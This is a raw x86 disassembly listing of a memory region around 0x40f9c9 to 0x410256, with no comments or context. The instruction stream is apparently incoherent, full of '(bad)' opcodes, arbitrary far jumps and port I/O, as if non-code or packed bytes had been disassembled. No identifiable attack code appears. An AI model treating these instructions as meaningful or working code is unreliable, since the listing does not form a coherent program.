  40f9c9:	ins    DWORD PTR es:[edi],dx
  40f9ca:	inc    ebp
  40f9cb:	adc    edi,eax
  40f9cd:	jg     0x40f982
  40f9cf:	mov    eax,DWORD PTR [edx+edi*4-0x52]
  40f9d3:	inc    esp
	...
  40f9e0:	add    BYTE PTR [eax],al
  40f9e2:	add    BYTE PTR [ebx+0x6d],ah
  40f9e5:	jnp    0x40f96d
  40f9e7:	lods   eax,DWORD PTR ds:[esi]
  40f9e8:	jg     0x40fa59
  40f9ea:	inc    ecx
  40f9eb:	mov    edi,0x9c979b83
  40f9f0:	push   cs
  40f9f1:	ins    DWORD PTR es:[edi],dx
  40f9f2:	pop    ebp
  40f9f3:	xchg   esp,eax
  40f9f4:	jg     0x40f9de
  40f9f6:	or     BYTE PTR [edi],0x6d
  40f9f9:	call   0xe8e0daf4
  40f9fe:	add    esp,DWORD PTR [ebx-0x7c]
  40fa01:	push   DWORD PTR [ebx-0x2c]
  40fa04:	jg     0x40fa13
  40fa06:	gs bnd jg 0x40fa08
  40fa0a:	jmp    0xd228f2ec
  40fa0f:	push   ecx
  40fa10:	es add cl,ch
  40fa13:	fyl2xp1 
  40fa15:	out    0x62,eax
  40fa17:	out    0x8b,al
  40fa19:	(bad)  
  40fa1a:	cwde   
  40fa1b:	out    0xd5,eax
  40fa1d:	jmp    0x52f9:0x3bb05d0f
  40fa24:	or     eax,0x95df03c
  40fa29:	sub    al,0xd9
  40fa2b:	leave  
  40fa2c:	add    ch,BYTE PTR [eax+ebp*1]
  40fa2f:	arpl   WORD PTR [ebx],cx
  40fa31:	adc    BYTE PTR [ebp+0x6909f530],0xe4
  40fa38:	cmp    eax,0x6ae0ec77
  40fa3d:	das    
  40fa3e:	xchg   edx,eax
  40fa3f:	(bad)  
  40fa40:	(bad)  
  40fa41:	jmp    0x40fa6b
  40fa43:	fild   WORD PTR [edx+0x9]
  40fa46:	test   eax,0x0
	...
  40fa53:	add    BYTE PTR [eax],al
  40fa55:	add    al,al
  40fa57:	add    cl,BYTE PTR [edx]
  40fa59:	sub    eax,0x300acd8a
  40fa5e:	jae    0x40faaf
  40fa60:	pop    eax
  40fa61:	pusha  
  40fa62:	fwait
  40fa63:	popa   
  40fa64:	(bad)  
  40fa65:	aam    0xe8
  40fa67:	pop    DWORD PTR [ecx+ecx*2+0x5]
  40fa6b:	retf   0xe9d7
  40fa6e:	pusha  
  40fa6f:	add    eax,0x59236400
  40fa74:	dec    edi
  40fa75:	ret    
  40fa76:	addr16 jmp 0x40fa78
  40fa79:	xchg   edx,eax
  40fa7a:	pusha  
  40fa7b:	jmp    0x40fa7c
  40fa7d:	xchg   edx,eax
  40fa7e:	pusha  
  40fa7f:	nop
  40fa80:	inc    esp
  40fa81:	xor    eax,0xd6147e50
  40fa86:	scas   eax,DWORD PTR es:[edi]
  40fa87:	(bad)  
  40fa8a:	xchg   ecx,eax
  40fa8b:	inc    edx
  40fa8c:	jb     0x40fab0
  40fa8e:	or     DWORD PTR ds:0x65f600d8,ecx
  40fa94:	std    
  40fa95:	jne    0x40faed
  40fa97:	xchg   DWORD PTR [ebx-0x28],esi
  40fa9a:	jge    0x40faaa
  40fa9c:	in     al,0xff
  40fa9e:	mov    bh,0x9d
  40faa0:	std    
  40faa1:	jne    0x40fae5
  40faa3:	call   0x75fd:0x881dfcbb
  40faaa:	add    ah,BYTE PTR [ecx+0x24a2096]
  40fab0:	push   DWORD PTR [ebp+0x1e]
  40fab3:	mov    eax,ds:0x87fd4f78
  40fab8:	std    
  40fab9:	jne    0x40fabb
	...
  40fac7:	add    BYTE PTR [eax],al
  40fac9:	shl    BYTE PTR [eax-0x7802b090],cl
  40facf:	std    
  40fad0:	jne    0x40fab8
  40fad2:	mov    al,ds:0x87dd4f68
  40fad7:	mov    eax,DWORD PTR [ebp-0x76]
  40fada:	cmp    eax,ebp
  40fadc:	nop
  40fadd:	push   edi
  40fade:	mov    ch,bh
  40fae0:	pop    edi
  40fae1:	dec    esp
  40fae2:	mov    edx,0x2efa0cc0
  40fae7:	mov    ebp,esp
  40fae9:	jns    0x40fb30
  40faeb:	cli    
  40faec:	push   0xffffffca
  40faee:	sbb    eax,DWORD PTR [ebp-0x1]
  40faf1:	mov    bh,0x79
  40faf3:	out    0x81,al
  40faf5:	out    dx,al
  40faf6:	mov    ch,bh
  40faf8:	mov    edi,esi
  40fafa:	test   ebp,edi
  40fafc:	jne    0x40fab0
  40fafe:	cdq    
  40faff:	and    ch,bh
  40fb01:	ins    DWORD PTR es:[edi],dx
  40fb02:	mov    BYTE PTR [eax+0x5],ch
  40fb05:	and    bh,bh
  40fb07:	push   ecx
  40fb08:	(bad)  
  40fb09:	jge    0x40fb87
  40fb0b:	mov    esi,0x68319c74
  40fb10:	mul    DWORD PTR [ebx+0x2f]
  40fb13:	inc    esp
  40fb14:	add    bl,bh
  40fb16:	imul   eax,DWORD PTR [edx],0xffffffef
  40fb19:	lds    edx,FWORD PTR [ebx+0x6c224577]
  40fb1f:	xor    bh,bh
  40fb21:	out    dx,al
  40fb22:	arpl   WORD PTR [edx-0x7c910ec3],bx
  40fb28:	out    0x4e,eax
  40fb2a:	aaa    
  40fb2b:	test   esi,edi
	...
  40fb39:	add    BYTE PTR [eax],al
  40fb3b:	add    BYTE PTR [edx+edx*8-0x79],bl
  40fb3f:	dec    dh
  40fb41:	call   0x834b:0x9f87
  40fb47:	enter  0x6b21,0x2
  40fb4b:	push   ebp
  40fb4c:	call   0x38047a9b
  40fb51:	sbb    al,0x1a
  40fb53:	add    BYTE PTR [ecx+0x5b748524],bh
  40fb59:	xchg   esi,eax
  40fb5a:	xlat   BYTE PTR ds:[ebx]
  40fb5b:	dec    ebx
  40fb5c:	sbb    al,0x9c
  40fb5e:	jns    0x40fba4
  40fb60:	pop    ss
  40fb61:	call   0x2d7c692b
  40fb66:	add    al,0x80
  40fb68:	inc    esp
  40fb69:	outs   dx,BYTE PTR ds:[esi]
  40fb6a:	push   cs
  40fb6b:	push   ecx
  40fb6c:	mov    esp,DWORD PTR [esi+0x1b63413c]
  40fb72:	pushf  
  40fb73:	jne    0x40fbb7
  40fb75:	outs   dx,BYTE PTR ds:[esi]
  40fb76:	add    cl,BYTE PTR [ebx]
  40fb78:	and    ebx,DWORD PTR [ebx+0x0]
  40fb7b:	jmp    0x40fbe9
  40fb7d:	push   esi
  40fb7e:	mov    dl,0x45
  40fb80:	and    ch,BYTE PTR [esi+0x2b]
  40fb83:	call   0x4508ce
  40fb88:	pop    eax
  40fb89:	cs mov db2,esp
  40fb8d:	(bad)  
  40fb8e:	jp     0x40fbe7
  40fb90:	mov    ah,0x33
  40fb92:	clc    
  40fb93:	mov    edi,0x68325537
  40fb98:	arpl   WORD PTR ds:0xedde94e9,ax
  40fb9e:	cmp    eax,0x3d
	...
  40fbaf:	and    al,BYTE PTR ds:0xd1784b9
  40fbb5:	add    DWORD PTR ds:0x9b057c10,ecx
  40fbbb:	ret    0xfdcb
  40fbbe:	cmp    DWORD PTR [eax+0x38],0x29
  40fbc2:	dec    edx
  40fbc3:	ins    DWORD PTR es:[edi],dx
  40fbc4:	jl     0x40fbb3
  40fbc6:	xor    DWORD PTR [edx-0x55],0x20
  40fbca:	or     edx,esi
  40fbcc:	lods   al,BYTE PTR ds:[esi]
  40fbcd:	(bad)  
  40fbcf:	pop    eax
  40fbd0:	jl     0x40fc2d
  40fbd2:	or     al,0x3b
  40fbd4:	add    al,0x1d
  40fbd6:	add    DWORD PTR [ebp-0x24],0xffffffaf
  40fbda:	inc    esi
  40fbdb:	pusha  
  40fbdc:	add    eax,0x86488f14
  40fbe1:	lods   al,BYTE PTR ds:[esi]
  40fbe2:	push   esp
  40fbe3:	xor    eax,0x9f91ad7c
  40fbe8:	jns    0x40fc22
  40fbea:	adc    DWORD PTR [edi+0x68f99e15],0x6d
  40fbf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf2:	and    al,0x63
  40fbf4:	add    eax,0x825543e2
  40fbf9:	mov    ebx,0xa6056305
  40fbfe:	leave  
  40fbff:	in     al,dx
  40fc00:	add    al,0xe9
  40fc02:	add    esp,DWORD PTR [ebx+0x44]
  40fc05:	and    esi,DWORD PTR [ebp+eiz*8+0x3]
  40fc09:	jmp    0xd3464511
  40fc0e:	add    ecx,DWORD PTR [ecx+0x5]
  40fc11:	ret    
  40fc12:	add    eax,DWORD PTR [eax]
	...
  40fc20:	add    BYTE PTR [eax],al
  40fc22:	faddp  st(1),st
  40fc24:	pop    eax
  40fc25:	aam    0xd7
  40fc27:	cmp    DWORD PTR [eax],0x987bbd7b
  40fc2d:	sub    BYTE PTR [edi],0x7d
  40fc30:	push   DWORD PTR ds:0x4fe77faa
  40fc36:	jg     0x40fc3d
  40fc38:	add    dl,dh
  40fc3a:	and    al,bh
  40fc3c:	add    al,0x10
  40fc3e:	pop    ss
  40fc3f:	add    eax,0x4178e900
  40fc44:	daa    
  40fc45:	test   al,0x60
  40fc47:	jl     0x40fcbd
  40fc49:	(bad)  [eax]
  40fc4b:	inc    ebp
  40fc4c:	push   eax
  40fc4d:	(bad)  
  40fc4e:	loope  0x40fc1b
  40fc50:	mov    bl,BYTE PTR [ecx]
  40fc52:	rol    BYTE PTR [eax+0x7ae1f6ef],cl
  40fc58:	dec    edi
  40fc59:	cmp    ecx,edi
  40fc5b:	mov    ch,0x50
  40fc5d:	fsubrp st(1),st
  40fc5f:	lea    eax,[ebp+eax*8-0x3e018437]
  40fc66:	pop    ecx
  40fc67:	retf   
  40fc68:	inc    dh
  40fc6a:	rol    ecx,cl
  40fc6c:	repz sbb DWORD PTR [edi+0x3a],eax
  40fc70:	inc    edi
  40fc71:	sub    BYTE PTR [edi+0x7a],ah
  40fc74:	mov    ah,0xbd
  40fc76:	test   eax,0x1ba6fe7b
  40fc7b:	psubsb mm6,mm1
  40fc7e:	das    
  40fc7f:	jl     0x40fc7f
  40fc81:	pusha  
  40fc82:	fist   DWORD PTR [edx-0xa]
  40fc85:	mov    es,WORD PTR [eax]
	...
  40fc93:	add    BYTE PTR [eax],al
  40fc95:	loope  0x40fc83
  40fc97:	call   DWORD PTR [eax]
  40fc99:	sub    esp,eax
  40fc9b:	inc    eax
  40fc9c:	jmp    0x7f2cae82
  40fca1:	loope  0x40fd1e
  40fca3:	(bad)  
  40fca4:	hlt    
  40fca5:	push   esp
  40fca6:	ins    DWORD PTR es:[edi],dx
  40fca7:	in     al,dx
  40fca8:	mov    ecx,0x64887be1
  40fcad:	dec    eax
  40fcae:	jae    0x40fcae
  40fcb0:	push   esi
  40fcb1:	mov    esi,0x99b8667a
  40fcb6:	(bad)  
  40fcb9:	and    eax,0x75f7eabd
  40fcbe:	xchg   ebp,edi
  40fcc0:	jne    0x40fc88
  40fcc2:	out    dx,al
  40fcc3:	rcl    BYTE PTR [eax+0x75],1
  40fcc6:	xchg   DWORD PTR [edi-0x200917b],eax
  40fccc:	inc    DWORD PTR [edi]
  40fcce:	(bad)  
  40fccf:	shl    bh,cl
  40fcd1:	jne    0x40fc5a
  40fcd3:	dec    esi
  40fcd4:	push   0x3f4fe3
  40fcd9:	gs mov ebp,0x8475f7ea
  40fcdf:	std    
  40fce0:	jne    0x40fc68
  40fce2:	out    dx,al
  40fce3:	mov    al,0x50
  40fce5:	jne    0x40fc6b
  40fce7:	or     eax,eax
  40fce9:	mov    esi,0xebd831e
  40fcee:	cld    
  40fcef:	std    
  40fcf0:	(bad)  
  40fcf1:	ds jae 0x40fd02
  40fcf4:	jmp    FWORD PTR [edx-0x6c]
  40fcf7:	and    eax,0x0
	...
  40fd06:	add    BYTE PTR [eax],al
  40fd08:	std    
  40fd09:	cmp    ebp,0x50
  40fd0c:	adc    al,BYTE PTR [ecx*2+0x12e7f5ff]
  40fd13:	or     edi,edx
  40fd15:	jl     0x40fd1b
  40fd17:	push   eax
  40fd18:	repnz outs dx,DWORD PTR ds:[esi]
  40fd1a:	dec    ebx
  40fd1b:	push   ebp
  40fd1d:	retf   
  40fd1e:	and    eax,0xffffffed
  40fd21:	cmp    ebp,0x15
  40fd24:	cli    
  40fd25:	add    eax,0x6e0a6a00
  40fd2a:	push   esi
  40fd2b:	inc    edi
  40fd2c:	dec    ebx
  40fd2d:	add    edi,edi
  40fd2f:	mov    ch,0xe6
  40fd31:	sti    
  40fd32:	std    
  40fd33:	push   DWORD PTR [ebp+0x72]
  40fd36:	or     ch,al
  40fd38:	mov    dh,0x55
  40fd3a:	std    
  40fd3b:	call   DWORD PTR [ebx-0x7e]
  40fd3e:	(bad)  
  40fd40:	arpl   bx,dx
  40fd42:	sub    BYTE PTR [ecx+0x63],0x44
  40fd46:	test   BYTE PTR [esi+0x22],0x6c
  40fd4a:	jg     0x40fd00
  40fd4c:	(bad)  
  40fd4d:	xor    al,BYTE PTR [ecx+0xeb8acfe]
  40fd53:	call   0xfec0996a
  40fd58:	jmp    0x851a:0x94f653e8
  40fd5f:	mov    esp,0xfe811aab
  40fd64:	arpl   WORD PTR [ebx-0x7a],bx
  40fd67:	xchg   ebx,eax
  40fd68:	arpl   WORD PTR [edx+eax*1+0x68],bp
	...
  40fd78:	add    BYTE PTR [eax],al
  40fd7a:	add    ah,dh
  40fd7c:	mov    ds:0xa8dfffc1,al
  40fd81:	jbe    0x40fdd2
  40fd83:	xor    BYTE PTR fs:[esi+esi*8+0x5c],bl
  40fd88:	pusha  
  40fd89:	push   0x6b
  40fd8b:	rcl    DWORD PTR [edi+0x7f],1
  40fd8e:	or     ah,BYTE PTR [ebx]
  40fd90:	(bad)  
  40fd92:	add    dh,0x52
  40fd95:	add    dh,BYTE PTR [ebp+esi*4-0x15]
  40fd99:	mov    ebp,0x7fb82ce3
  40fd9e:	push   DWORD PTR [eax+0x3bbc84c1]
  40fda4:	mov    al,0x7f
  40fda6:	(bad)  
  40fda7:	arpl   WORD PTR [edx],bx
  40fda9:	call   0x6faf7115
  40fdae:	mov    ebp,0xe80c1a0c
  40fdb3:	xchg   ecx,eax
  40fdb4:	and    eax,0x39fcfe81
  40fdb9:	imul   esi,esi,0xfffffff4
  40fdbc:	idiv   DWORD PTR [edi+0x74]
  40fdbf:	pop    ebx
  40fdc0:	xchg   BYTE PTR [eax+0x48],cl
  40fdc3:	in     al,0xe7
  40fdc5:	jg     0x40fd7b
  40fdc7:	mov    DWORD PTR ds:0x78d5805e,0xbdbb0bd3
  40fdd1:	lahf   
  40fdd2:	add    ch,0x78
  40fdd5:	shl    DWORD PTR [edi-0x43],cl
  40fdd8:	mov    dl,0x20
  40fdda:	js     0x40fd91
  40fddc:	js     0x40fe1b
  40fdde:	test   BYTE PTR [eax],0x0
	...
  40fded:	add    BYTE PTR [ebp+ebp*2-0x4f],ah
  40fdf1:	retf   0x78a5
  40fdf4:	sub    eax,0x2570bcb6
  40fdf9:	adc    BYTE PTR [ebp+0x556bf0f2],0xce
  40fe00:	adc    eax,0x2cb28580
  40fe05:	js     0x40fe84
  40fe07:	js     0x40fe0e
  40fe09:	neg    BYTE PTR [ebp+ebp*2+0x71]
  40fe0d:	retf   0x786d
  40fe10:	cmc    
  40fe11:	mov    ch,0x94
  40fe13:	jo     0x40fe02
  40fe15:	jg     0x40fe74
  40fe17:	repnz lock imul edx,edi,0xffffffce
  40fe1c:	fnstsw WORD PTR [edi+0x4d]
  40fe1f:	mov    dl,0xb0
  40fe21:	ja     0x40fe68
  40fe23:	js     0x40fde5
  40fe25:	xchg   DWORD PTR [eax-0x10803a88],ebp
  40fe2b:	ins    BYTE PTR es:[edi],dx
  40fe2c:	mov    ch,0x7f
  40fe2e:	sub    eax,0x25d0346d
  40fe33:	js     0x40fde2
  40fe35:	mov    ecx,0x7fa57038
  40fe3a:	cld    
  40fe3b:	cmc    
  40fe3c:	sub    al,0x7f
  40fe3e:	or     eax,0xd685b78
  40fe43:	js     0x40fdd2
  40fe45:	ins    BYTE PTR es:[edi],dx
  40fe46:	xchg   cl,cl
  40fe48:	test   DWORD PTR [edi-0xb],edi
  40fe4b:	mov    cl,0x98
  40fe4d:	ja     0x40fe3c
  40fe4f:	ja     0x40fe50
  40fe51:	add    BYTE PTR [eax],0x0
	...
  40fe60:	add    BYTE PTR [eax],cl
  40fe62:	int3   
  40fe63:	(bad)  
  40fe64:	outs   dx,BYTE PTR ds:[esi]
  40fe65:	pop    esp
  40fe66:	mov    cl,0xeb
  40fe68:	pop    esi
  40fe69:	push   esp
  40fe6a:	ja     0x40fe6a
  40fe6c:	aam    0x5c
  40fe6e:	js     0x40fee4
  40fe70:	loope  0x40feaa
  40fe72:	inc    edx
  40fe73:	cld    
  40fe74:	dec    esi
  40fe75:	cmp    al,0x77
  40fe77:	mov    ah,0x55
  40fe79:	sub    al,0x77
  40fe7b:	(bad)  
  40fe7c:	push   ecx
  40fe7d:	ins    BYTE PTR es:[edi],dx
  40fe7e:	leave  
  40fe7f:	(bad)  
  40fe80:	ss and al,0xc1
  40fe83:	test   DWORD PTR [eax+0x39],0x1426fe79
  40fe8a:	icebp  
  40fe8b:	sti    
  40fe8c:	adc    esi,ebx
  40fe8e:	sbb    DWORD PTR [eax],eax
  40fe90:	jmp    0xe94c44ac
  40fe95:	fwait
  40fe96:	mov    ch,bl
  40fe98:	push   0x2b
  40fe9a:	mov    WORD PTR fs:[esp+ebp*8-0x623e9839],fs
  40fea2:	(bad)  
  40fea3:	inc    DWORD PTR [eax-0x16bf3f31]
  40fea9:	aad    0xf1
  40feab:	or     edx,ecx
  40fead:	test   esi,eax
  40feaf:	(bad)  
  40feb0:	(bad)  
  40feb1:	pop    ecx
  40feb2:	inc    ebp
  40feb3:	jae    0x40fef7
  40feb5:	pop    ss
  40feb6:	test   BYTE PTR [ebp+eax*8+0x5c],bh
  40feba:	lock pop esi
  40febc:	mov    esi,0xb1448670
  40fec1:	(bad)  
  40fec3:	div    DWORD PTR [ebp+0x0]
	...
  40fed1:	add    BYTE PTR [eax],al
  40fed3:	add    BYTE PTR [edi+0x5],ah
  40fed6:	add    BYTE PTR [edi],bl
  40fed8:	pop    esp
  40fed9:	ds inc esp
  40fedb:	mov    eax,ds:0xe9000594
  40fee0:	jns    0x40fea6
  40fee2:	(bad)  
  40fee3:	adc    al,0x7f
  40fee5:	fidiv  WORD PTR [ecx]
  40fee7:	add    BYTE PTR [ebp+0x40],al
  40feea:	dec    BYTE PTR [edi+eax*2+0x16e84eed]
  40fef1:	sbb    DWORD PTR [eax],eax
  40fef3:	add    BYTE PTR [ecx-0x42],cl
  40fef6:	or     ch,BYTE PTR [edx-0x36]
  40fef9:	xchg   ebp,eax
  40fefa:	inc    ebx
  40fefb:	in     al,0xa
  40fefd:	imul   esp,edi,0x46
  40ff00:	sti    
  40ff01:	add    bh,bh
  40ff03:	jne    0x40fea3
  40ff05:	jmp    0xc009:0xf71d4edc
  40ff0c:	test   BYTE PTR [esi],0x50
  40ff0f:	push   0xbeef02bb
  40ff14:	cli    
  40ff15:	div    DWORD PTR [ebx+0x8]
  40ff18:	jb     0x40febf
  40ff1a:	imul   edi,edi,0x6d
  40ff1d:	jmp    0x4dfd:0xf76d4bac
  40ff24:	push   edx
  40ff25:	cmp    DWORD PTR [ebx-0x8],0xffffff8a
  40ff29:	jge    0x40fee1
  40ff2b:	call   0x3e4a4a
  40ff30:	inc    ebx
  40ff31:	les    eax,FWORD PTR [esi]
  40ff33:	add    bh,dh
  40ff35:	mov    ch,dl
  40ff37:	add    DWORD PTR [eax],0x0
	...
  40ff46:	add    BYTE PTR [esi],al
  40ff48:	test   DWORD PTR [eax+0x0],ebp
  40ff4b:	mov    al,0x40
  40ff4d:	std    
  40ff4e:	jne    0x40ff92
  40ff50:	jmp    0x4587:0xf82d48c0
  40ff57:	push   ds
  40ff58:	imul   eax,DWORD PTR ds:0xff017b47,0x412a4735
  40ff62:	add    ch,cl
  40ff64:	ins    DWORD PTR es:[edi],dx
  40ff65:	push   es
  40ff66:	call   0x3e8465
  40ff6b:	jb     0x40ff6d
  40ff6d:	inc    edi
  40ff6e:	inc    ecx
  40ff6f:	arpl   WORD PTR [edx+ebp*8+0x1],bp
  40ff73:	arpl   WORD PTR [edx+eax*4-0x2],bp
  40ff77:	outs   dx,BYTE PTR ds:[esi]
  40ff78:	je     0x40ffe4
  40ff7a:	fucomp st(7)
  40ff7c:	idiv   BYTE PTR [esi+edi*8+0x2e]
  40ff80:	sbb    DWORD PTR [ebx],ebp
  40ff82:	inc    ecx
  40ff83:	arpl   di,sp
  40ff85:	test   BYTE PTR [edi],0xcb
  40ff88:	adc    al,0x7d
  40ff8a:	dec    ah
  40ff8c:	push   ebx
  40ff8d:	add    BYTE PTR [eax],al
  40ff8f:	arpl   sp,bp
  40ff91:	jl     0x410007
  40ff93:	imul   eax,esp,0x1f
  40ff96:	push   DWORD PTR [esi+edi*4+0x36af747c]
  40ff9d:	test   DWORD PTR [edi],0xfecbf1bb
  40ffa3:	pushf  
  40ffa4:	and    al,0x42
  40ffa6:	add    esp,DWORD PTR [ebx-0x47]
  40ffa9:	xchg   ebx,ebp
	...
  40ffb7:	add    BYTE PTR [eax],al
  40ffb9:	add    al,ah
  40ffbb:	pop    ds
  40ffbc:	pusha  
  40ffbd:	push   ebp
  40ffbe:	sub    al,0x82
  40ffc0:	add    ch,BYTE PTR [edx+0x2b]
  40ffc3:	pop    es
  40ffc4:	test   DWORD PTR [edi],0xfeca9f8b
  40ffca:	ins    BYTE PTR es:[edi],dx
  40ffcb:	hlt    
  40ffcc:	(bad)  
  40ffcd:	sti    
  40ffce:	loopne 0x40ff80
  40ffd0:	ja     0x40ffff
  40ffd2:	mov    ds:0xdf0f025e,al
  40ffd7:	mov    ecx,0xdf630001
  40ffdc:	cmp    eax,0x41d75ff
  40ffe1:	add    BYTE PTR [edx+ebp*8+0x42],ch
  40ffe5:	add    BYTE PTR [ebx+0x5e],ah
  40ffe8:	jg     0x410026
  40ffea:	fs add eax,ebx
  40ffed:	jmp    DWORD PTR [esp+ebp*2]
  40fff0:	xchg   BYTE PTR [edx-0x7cfda19e],dh
  40fff6:	push   esi
  40fff7:	add    eax,0x5a22db2
  40fffc:	jmp    0xe7ecdf0d
  410001:	add    esp,DWORD PTR [ebx-0x78]
  410004:	retf   
  410005:	dec    esp
  410006:	inc    esi
  410007:	(bad)  
  410008:	call   0x5fca5c10
  41000d:	add    ah,BYTE PTR [ebx+0x5]
  410010:	push   0x3e
  410012:	mov    al,0x23
  410014:	sub    BYTE PTR [ebx+eiz*2],al
  410017:	add    al,0x6d
  410019:	(bad)  
  41001a:	arpl   WORD PTR ds:0x80e9,ax
	...
  41002c:	add    BYTE PTR [edi-0x433cf9a4],al
  410032:	je     0x410011
  410034:	xchg   DWORD PTR ds:0xe003e906,esi
  41003a:	xor    ch,dl
  41003c:	sub    al,0x22
  41003e:	add    eax,0xf7e70ce9
  410043:	out    0x3,eax
  410045:	arpl   bp,bx
  410047:	jge    0x41000d
  410049:	and    eax,DWORD PTR ds:0x1a840393
  41004f:	adc    ch,BYTE PTR ds:0xc6600522
  410055:	ins    BYTE PTR es:[edi],dx
  410056:	mov    BYTE PTR [ebx+0x65036c7b],al
  41005c:	(bad)  [ebx+0x5]
  41005f:	jmp    0xee1c558c
  410064:	cmc    
  410065:	dec    esp
  410066:	je     0x410063
  410068:	jp     0x4100e8
  41006a:	(bad)  
  41006b:	call   0xdf4134fe
  410070:	icebp  
  410071:	addr16 pop esi
  410073:	push   ss
  410074:	add    eax,0xd2720563
  410079:	pop    eax
  41007a:	xor    BYTE PTR [edx],0xec
  41007d:	fldz   
  41007f:	inc    DWORD PTR [esi+ebp*8-0x40]
  410083:	repz loop 0x41001f
  410086:	add    eax,DWORD PTR [esp+eax*1-0x6ffffa9a]
  41008d:	pop    ecx
  41008e:	push   es
  41008f:	add    cl,ch
	...
  41009d:	add    BYTE PTR [eax],al
  41009f:	add    BYTE PTR [eax],cl
  4100a1:	mov    es,WORD PTR [esi+0x28]
  4100a4:	pop    edi
  4100a5:	je     0x4100dd
  4100a7:	xchg   ecx,eax
  4100a8:	inc    esi
  4100a9:	adc    DWORD PTR [eax],eax
  4100ab:	jmp    0x6c4f4605
  4100b0:	push   ebx
  4100b1:	je     0x4100b1
  4100b3:	jmp    0xe948f395
  4100b8:	pop    ecx
  4100b9:	mov    ecx,ebp
  4100bb:	jmp    0xdf400620
  4100c0:	push   0x39a35f5d
  4100c5:	jae    0x41004f
  4100c7:	lods   al,BYTE PTR ds:[esi]
  4100c8:	xor    BYTE PTR [ebx+0x76],dh
  4100cb:	icebp  
  4100cc:	sub    ecx,edi
  4100ce:	out    dx,eax
  4100cf:	ss nop
  4100d1:	jmp    edi
  4100d3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4100d5:	jb     0x4100d5
  4100d7:	xchg   ecx,eax
  4100d8:	in     al,dx
  4100d9:	retf   0xe940
  4100dc:	or     ecx,edi
  4100de:	out    dx,eax
  4100df:	add    DWORD PTR [esi],ecx
  4100e1:	verw   cx
  4100e4:	gs inc ebp
  4100e6:	push   cs
  4100e7:	ins    BYTE PTR es:[edi],dx
  4100e8:	mov    bl,0x73
  4100ea:	(bad)  
  4100eb:	jmp    0xaccc7466
  4100f0:	enter  0x8cc2,0xa4
  4100f4:	mov    esp,0x3ee969c2
  4100f9:	jae    0x41014f
  4100fb:	fidiv  WORD PTR [ebx+0xa]
  4100fe:	das    
  4100ff:	sub    BYTE PTR [edi-0x2],ah
  410102:	mov    edi,0xde
	...
  410113:	mov    ah,0x9b
  410115:	(bad)  
  410116:	(bad)  
  410117:	cmp    al,BYTE PTR [edi]
  410119:	lea    eax,[ebp+0x1e]
  41011c:	push   edi
  41011d:	std    
  41011e:	jne    0x410142
  410120:	lock jae 0x41010f
  410123:	lds    edx,FWORD PTR ds:0x93b2ecb
  410129:	or     eax,eax
  41012b:	outs   dx,BYTE PTR ds:[esi]
  41012c:	jno    0x4100b9
  41012e:	inc    ebp
  41012f:	jmp    0x6a09:0x60006856
  410136:	pop    es
  410137:	push   eax
  410138:	or     edi,edi
  41013a:	jne    0x41011a
  41013c:	out    dx,eax
  41013d:	adc    ecx,edi
  41013f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410140:	dec    ecx
  410141:	dec    BYTE PTR [edx]
  410143:	or     ah,BYTE PTR [ebx+0x54]
  410146:	jmp    FWORD PTR [edi+0x13e8e6e6]
  41014c:	lock std 
  41014e:	mov    DWORD PTR [edi],ecx
  410150:	fisttp DWORD PTR [ebx-0x2a9d5bb]
  410156:	jne    0x4100de
  410158:	pusha  
  410159:	(bad)  
  41015a:	imul   edi,DWORD PTR [ebp-0x200101a0],0x7515fdd2
  410164:	sbb    al,0x41
  410166:	add    BYTE PTR [ecx-0xdd68d3a],dl
  41016c:	push   es
  41016d:	add    bh,ch
  41016f:	adc    al,0xef
  410171:	jae    0x41017b
  410173:	bound  esi,QWORD PTR [esi]
  410175:	inc    esi
  410176:	inc    DWORD PTR [eax]
	...
  410184:	add    BYTE PTR [eax],al
  410186:	gs out dx,eax
  410188:	je     0x410192
  41018a:	gs jne 0x41018f
  41018d:	(bad)  
  41018e:	(bad)  
  410190:	out    0x58,eax
  410192:	cld    
  410193:	out    dx,al
  410194:	std    
  410195:	jmp    FWORD PTR [edi+0x675fde9]
  41019b:	in     al,dx
  41019c:	jae    0x4101a6
  41019e:	arpl   WORD PTR [ebp+ecx*8+0x45],ax
  4101a2:	xor    al,0x43
  4101a4:	js     0x41021a
  4101a6:	andps  xmm0,XMMWORD PTR [eax+ecx*2+0x7478b324]
  4101ae:	pop    es
  4101af:	mov    ebx,0x1d45d30e
  4101b4:	add    al,0x6a
  4101b6:	arpl   WORD PTR [ebx+0x7904ebee],bp
  4101bc:	dec    edi
  4101bd:	sub    eax,0x74775ca2
  4101c2:	repz and eax,0x48
  4101c6:	in     al,dx
  4101c7:	mov    al,BYTE PTR [esi+eax*8-0xc390cad]
  4101ce:	loopne 0x410248
  4101d0:	outs   dx,BYTE PTR ds:[esi]
  4101d1:	jmp    DWORD PTR [ebp-0x17]
  4101d4:	imul   edi,ebp,0xffffffcc
  4101d7:	jmp    0x6978:0xd2c5b46a
  4101de:	arpl   bx,bx
  4101e0:	out    dx,al
  4101e1:	div    DWORD PTR [eax+edi*2+0x5c222f03]
  4101e8:	ja     0x41025e
	...
  4101f6:	add    BYTE PTR [eax],al
  4101f8:	add    BYTE PTR [edi-0x74f810ce],ah
  4101fe:	cmc    
  4101ff:	sar    esi,0x94
  410202:	sbb    al,0xc8
  410205:	mov    eax,ds:0xd855025f
  41020a:	inc    DWORD PTR [edx+0x79129fc3]
  410210:	(bad)  
  410211:	out    0xa8,al
  410213:	jbe    0x410264
  410215:	ins    BYTE PTR es:[edi],dx
  410216:	lock push es
  410218:	jmp    FWORD PTR [esi]
  41021a:	cdq    
  41021b:	sub    DWORD PTR [ecx+0x63],eax
  41021e:	push   es
  41021f:	std    
  410220:	sbb    ah,BYTE PTR [ebx+0x5e]
  410223:	or     eax,eax
  410225:	pop    esp
  410226:	add    eax,0x563a86c
  41022b:	jmp    0xe8aea970
  410230:	add    esp,DWORD PTR [ebx+0x5]
  410233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410234:	mov    esi,0x3ed7130
  410239:	arpl   bx,bx
  41023b:	call   0xe9201f2d
  410240:	in     eax,dx
  410241:	adc    al,0x82
  410243:	and    esi,DWORD PTR [eax-0x64]
  410246:	sub    BYTE PTR [ebx+0x6f],0xd
  41024a:	jno    0x4101e9
  41024c:	sar    ebp,cl
  41024e:	cli    
  41024f:	nop
  410250:	js     0x4102c1
  410252:	jno    0x4101d4
  410254:	(bad)  
  410255:	dec    ecx
  410256:	add    eax,0xfa230ce9
